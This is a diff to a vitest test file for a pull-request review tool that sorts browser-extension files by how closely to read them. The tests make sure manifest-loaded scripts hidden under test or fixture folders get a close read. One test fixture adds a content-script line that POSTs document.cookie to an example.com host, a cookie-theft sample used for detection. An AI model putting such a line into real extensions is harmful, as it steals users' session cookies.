@@ -4,6 +4,7 @@ import { basename, join, relative } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import type { FileDiff } from '@airlock/shared';
 import { describe, expect, it } from 'vitest';
+import { gatherChecks } from '../../src/facts/checks.js';
 import { classifyFiles } from '../../src/facts/classify.js';
 import { EXTENSION_CHECKS } from '../../src/facts/extension-checks.js';
 import { kitCacheRoot } from '../../src/packs/kit-sync.js';
@@ -18,7 +19,8 @@ const extensions = () => loadPack(dir);
 const OWNER = 'Moxie-Pest-Control-Phoenix';
 const REPOS = ['scheduling-tool-suite', 'termites-tool-suite', 'moxie-click-to-dial', 'isales-audit-tool', 'TI-route-snapshot']
   .map((name) => `${OWNER}/${name}`);
-const KIT_FILES = ['standard.md', 'conventions.md', 'lens-rules.md', 'calibration.md', 'register.md', 'fieldroutes.md'];
+// lens-rules.md is the kit's own agents' operating instructions, not a standard: never attached.
+const KIT_FILES = ['standard.md', 'conventions.md', 'calibration.md', 'register.md', 'fieldroutes.md'];
 
 /** A local copy of the extension review kit, when this Mac has one; the comparison with it is skipped otherwise. */
 const KIT_COPY = '/Users/moxie/Projects/moxie-ext-review-kit/';
@@ -94,42 +96,74 @@ describe('the Extensions pack', () => {
     for (const path of [
       'manifest.json', 'background.js', 'content.js', 'bridge-content.js', 'sheets-content.js', 'config.js', 'destinations.js',
       'apps-script/dashboard-receiver.gs', 'route-monitor/TI_Route_Monitor_Receiver_v4.gs', 'route-monitor/manifest.json',
-      'route-monitor/background.js', 'coordination.js', 'fetch-helpers.js', '.github/workflows/ext-checks.yml', 'trufflehog-exclude.txt',
+      'route-monitor/background.js', 'coordination.js', 'fetch-helpers.js', 'background.mjs', 'sender-api.cjs', 'content.mjs', '.github/workflows/ext-checks.yml', 'trufflehog-exclude.txt',
     ]) expect(tierOf(path), path).toBe('read');
-    for (const path of ['popup.html', 'popup.js', 'popup.css', 'styles.css', 'options.html', 'options.js', 'sidepanel.js', 'batch-controller.js']) {
+    for (const path of [
+      'popup.html', 'popup.js', 'popup.css', 'styles.css', 'options.html', 'options.js', 'sidepanel.js', 'batch-controller.js',
+      'fixtures/inject.js', 'lib/test/sender.js', 'src/fixtures/data.js', 'lib/tests/helper.js',
+    ]) {
       expect(tierOf(path), path).toBe('skim');
     }
     for (const path of [
       'tests/reminder-policy.test.js', 'tests/run-all.cjs', 'tests/content.js', 'tests/fixtures/manifest.json', 'tests/check.py',
-      'README.md', 'CHANGELOG.md', 'PRIVACY.md', 'TEST-CHECKLIST.md', 'apps-script/SETUP.md',
+      'README.md', 'CHANGELOG.md', 'PRIVACY.md', 'TEST-CHECKLIST.md', 'apps-script/SETUP.md', 'inject.spec.js',
     ]) expect(tierOf(path), path).toBe('trust');
   });
 
-  it('has four lens briefs, each under 60 lines, in their own words, naming only the kit files the pack attaches', async () => {
+  it('reads closely every changed file the manifest loads, wherever it sits, and trusts a test the manifest does not name', async () => {
+    const pack = await extensions();
+    const generic = await loadPack(join(packsDir, 'generic'));
+    const head = JSON.stringify({
+      manifest_version: 3, name: 'Tool', version: '1.0.0', background: { service_worker: 'inject.spec.js' },
+      content_scripts: [{ matches: ['https://a.example.com/*'], js: ['fixtures/inject.js', 'tests/hook.js'] }],
+    });
+    const paths = ['fixtures/inject.js', 'inject.spec.js', 'tests/hook.js', 'lib/test/sender.js', 'tests/real.test.js'];
+    const files = paths.map(changed);
+    const { readClosely } = await gatherChecks(files, [pack, generic], async (p) => (p === 'manifest.json' ? head : null));
+    const tiers = classifyFiles(files, [pack, generic], readClosely);
+    expect(tiers.map((t) => [t.path, t.tier, t.reason])).toEqual([
+      ['fixtures/inject.js', 'read', 'extensions: loaded by manifest.json'],
+      ['inject.spec.js', 'read', 'extensions: loaded by manifest.json'],
+      ['tests/hook.js', 'read', 'extensions: loaded by manifest.json'],
+      ['lib/test/sender.js', 'skim', 'default'],
+      ['tests/real.test.js', 'trust', 'extensions: tests/**'],
+    ]);
+  });
+
+  it('has four lens briefs, each under 40 lines, pointing at the attached standards by name and asking for the whole candidate', async () => {
     const pack = await extensions();
     for (const lens of pack.lenses) {
       const lines = lens.instructions.trimEnd().split('\n').length;
       const words = lens.instructions.split(/\s+/).filter(Boolean).length;
-      expect(lines, lens.id).toBeLessThan(60);
+      expect(lines, lens.id).toBeLessThan(40);
       expect(words, lens.id).toBeGreaterThanOrEqual(100);
       expect(words, lens.id).toBeLessThanOrEqual(450);
       const named = [...lens.instructions.matchAll(/`([\w.-]+\.md)`/g)].map((m) => m[1]!);
       expect(named.length, lens.id).toBeGreaterThan(0);
       for (const name of named) expect(KIT_FILES, `${lens.id} names ${name}`).toContain(name);
-      expect(lens.instructions, lens.id).toContain('`calibration.md`');
+      for (const name of ['conventions.md', 'standard.md', 'calibration.md']) expect(lens.instructions, lens.id).toContain(`\`${name}\``);
+      expect(lens.instructions, lens.id).toMatch(/suggested change/);
+      expect(lens.instructions, lens.id).toMatch(/^Not this lens:/m);
+      expect(lens.instructions, lens.id).not.toMatch(/lens-rules/);
     }
   });
 
-  // Repository names and file paths (`owner/name`, `skills/ext-review/standard.md`) are names, not sentences: left out.
-  it.skipIf(!kitPresent)('no lens brief shares a sentence of eight words or more with a kit file', async () => {
+  // A net for copied text, not for paraphrase (the review is for that). Repository names and file paths (`owner/name`,
+  // `skills/ext-review/standard.md`) are names, not sentences: left out.
+  const COPY_TEST = 'no lens brief shares a sentence of eight words or more with a kit file, lenses.md or the kit\'s agent prompts';
+  it.skipIf(!kitPresent)(kitPresent ? COPY_TEST : `${COPY_TEST} (skipped: no copy of the extension review kit at ${KIT_COPY})`, async () => {
     const kitRuns = new Set<string>();
+    const compared: string[] = [];
     for (const sub of ['skills/ext-review', 'agents']) {
       if (!existsSync(join(KIT_COPY, sub))) continue;
       for (const path of await filesUnder(join(KIT_COPY, sub))) {
         if (!path.endsWith('.md')) continue;
+        compared.push(relative(KIT_COPY, path));
         for (const run of wordRuns(await readFile(path, 'utf8'))) kitRuns.add(run);
       }
     }
+    expect(compared).toContain('skills/ext-review/lenses.md');
+    expect(compared.filter((p) => p.startsWith('agents/')).length).toBeGreaterThan(0);
     expect(kitRuns.size).toBeGreaterThan(0);
     const shared: string[] = [];
     for (const path of await filesUnder(dir)) {
@@ -170,5 +204,21 @@ describe('a review with the Extensions pack', () => {
     ]);
     expect(doc.facts[0]!.message).toBe(
       'host_permissions before: https://*.pestroutes.com/*; after: https://*.pestroutes.com/*, <all_urls>; added: <all_urls>.');
+  }, 60_000);
+
+  it('a pull request that only changes a file under tests/ that the manifest loads is read by the lenses', async () => {
+    const pack = await extensions();
+    const cached = join(kitCacheRoot(pack.kit!), 'e'.repeat(40));
+    await mkdir(cached, { recursive: true });
+    for (const name of KIT_FILES) await writeFile(join(cached, name), `# ${basename(name, '.md')}\n`);
+    const manifest = `${JSON.stringify({ manifest_version: 3, name: 'Tool', version: '1.0.0', content_scripts: [{ matches: ['https://a.example.com/*'], js: ['tests/inject.js'] }] }, null, 2)}\n`;
+    const s = await scenario(
+      { 'manifest.json': manifest, 'tests/inject.js': 'const a = 1;\n' },
+      { 'tests/inject.js': 'const a = 1;\nfetch("https://a.example.com/x", { method: "POST", body: document.cookie });\n' },
+    );
+    const { doc, calls } = await review({ s, req: { packsDir, packIds: ['extensions'], kitDir: undefined }, exec: fakeGh({ baseSha: s.baseSha, headSha: s.headSha }) });
+    expect(doc.files).toEqual([{ path: 'tests/inject.js', tier: 'read', reason: 'extensions: loaded by manifest.json' }]);
+    expect(doc.facts.map((f) => f.message)).toContain('tests/inject.js sits under a test or fixture folder but the extension loads it.');
+    expect(calls.some((c) => c.role.startsWith('lens'))).toBe(true);
   }, 60_000);
 });
